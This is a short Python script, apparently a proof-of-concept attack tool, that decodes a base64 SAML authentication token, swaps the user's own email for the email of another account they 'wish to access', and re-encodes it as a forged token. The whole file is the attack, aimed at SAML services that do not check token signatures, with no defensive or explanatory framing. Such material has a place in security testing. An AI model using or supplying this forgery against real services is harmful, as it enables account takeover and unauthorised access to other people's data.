import urllib.parse, base64

# Recieve input values
token = str(input("Enter the BASE64 Encoded SAML authentication token: "))
email = str(input("What is your account's email?: "))
updatedEmail = str(input("And what is your email of the account you wish to access?: "))

# Decode, Update, Encode
token = base64.b64decode(urllib.parse.unquote(token)).decode("utf-8")
token = token.replace(email, updatedEmail);
token = urllib.parse.quote(base64.b64encode(token.encode("utf-8")))

print ("\n\n\t*** NEW TOKEN IS: ***\n\n", token)
